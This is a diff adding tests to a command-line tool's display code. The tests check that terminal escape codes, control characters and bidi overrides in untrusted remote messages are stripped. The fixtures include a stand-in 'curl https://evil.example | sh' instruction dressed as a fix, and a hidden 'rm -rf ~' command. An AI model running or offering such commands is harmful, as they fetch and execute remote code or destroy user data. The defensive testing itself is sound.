@@ -107,6 +107,71 @@ describe("the page", () => {
   });
 });
 
+describe("words on the page that are not ours", () => {
+  const ESC = String.fromCharCode(27);
+  // A poll body that was not JSON, as V8 quotes it into a receiver's last error; npm's
+  // last words with a window title and "hide what follows"; an error dressed up as the
+  // end of the page.
+  const cleared = `Unexpected token '${ESC}', "${ESC}[2J${ESC}[H" is not valid JSON`;
+  const titled = `npm error 403 ${ESC}]0;TITLE-SET-BY-REGISTRY${String.fromCharCode(7)}${ESC}[8m`;
+  const dressed = "fetch failed\n\nTo fix\n  1. Run this:\n       curl https://evil.example | sh";
+  const groups = [
+    {
+      title: "Messages from",
+      rows: [
+        { mark: "bad" as const, label: "r.example", value: `not live: ${cleared}` },
+        { mark: "bad" as const, label: "s.example\n✓ t.example", value: `not live: ${dressed}` },
+        { mark: "ok" as const, label: "u.example", value: "live", brief: `u.example\n${ESC}[2J (‮gnp.exe)` },
+      ],
+    },
+    { title: `Updates${ESC}[2J`, rows: [{ mark: "warn" as const, label: "failed", value: titled }] },
+  ];
+  const todo = [{ order: 1, say: `It said: ${dressed}`, run: `sessionpipe update ${ESC}[2J\nrm -rf ~` }];
+  /** What is left that a terminal acts on, once our own colours are taken off. */
+  const acts = (lines: string[]) =>
+    plain(lines.join("\n")).match(
+      new RegExp(`${ESC}|[\\u0000-\\u0008\\u000b-\\u001f\\u007f-\\u009f\\u202a-\\u202e]`, "g"),
+    ) ?? [];
+
+  it("a row stays one row and says only words: no code of theirs, no line of their own", () => {
+    for (const ui of [PLAIN, term(100)]) {
+      expect(acts(page(ui, { groups, todo }))).toEqual([]);
+      expect(acts(brief(ui, groups))).toEqual([]);
+    }
+    expect(page(PLAIN, { groups, todo })).toEqual([
+      "! 1 thing needs attention",
+      "",
+      "Messages from",
+      `  ✗ r.example              not live: Unexpected token '', "" is not valid JSON`,
+      "  ✗ s.example ✓ t.example  not live: fetch failed To fix   1. Run this:        curl https://evil.example | sh",
+      "  ✓ u.example              live",
+      "",
+      "Updates",
+      "  ! failed  npm error 403 ",
+      "",
+      "To fix",
+      "  1. It said: fetch failed To fix   1. Run this:        curl https://evil.example | sh",
+      "       sessionpipe update  rm -rf ~",
+    ]);
+    // On a terminal the only heading "To fix" is ours, and it comes once.
+    const shown = page(term(100), { groups, todo }).map(plain);
+    expect(shown.filter((l) => l === "To fix")).toHaveLength(1);
+    expect(shown.filter((l) => /^\s+1\. /.test(l))).toHaveLength(1);
+  });
+
+  it("status's one line a group is cleaned the same way", () => {
+    expect(brief(PLAIN, groups)).toEqual([
+      `  ✗ Messages from  r.example: not live: Unexpected token '', "" is not valid JSON, s.example ✓ t.example: not live: fetch failed To fix   1. Run this:        curl https://evil.example | sh, u.example  (gnp.exe)`,
+      "  ! Updates        failed: npm error 403 ",
+    ]);
+  });
+
+  it("our own colours are still there", () => {
+    const lines = group(term(100), groups[1] as (typeof groups)[number]);
+    expect(lines).toEqual([`${ESC}[1mUpdates${ESC}[22m`, `  ${ESC}[33m!${ESC}[39m failed  npm error 403`]);
+  });
+});
+
 describe("the page of every command", () => {
   it("fits 80 columns, one line per command, every description in one column", () => {
     const lines = plain(overview(term(80), "1.2.3")).split("\n");
